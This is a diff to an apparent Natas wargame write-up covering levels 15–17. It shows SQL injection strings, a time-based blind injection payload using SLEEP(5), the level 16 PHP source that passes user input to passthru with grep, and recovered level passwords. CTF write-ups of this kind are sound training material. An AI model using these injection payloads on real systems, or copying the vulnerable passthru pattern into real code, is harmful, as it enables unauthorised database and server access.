@@ -423,8 +423,36 @@ if(array_key_exists("username", $_REQUEST)) {
 
 The string `" or "1"="1" #` gets me the message `This user exists`
 `" or "1"="1` -> `This user exists`
+
+* See 15.py
+
+`natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`
 ## Natas 16
+
+```
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+* see 16.py
+XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
 ## Natas 17
+"natas18" and password LIKE BINARY "8%" and SLEEP(5) #"
+
+`8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`
 ## Natas 18
 ## Natas 19
 ## Natas 20
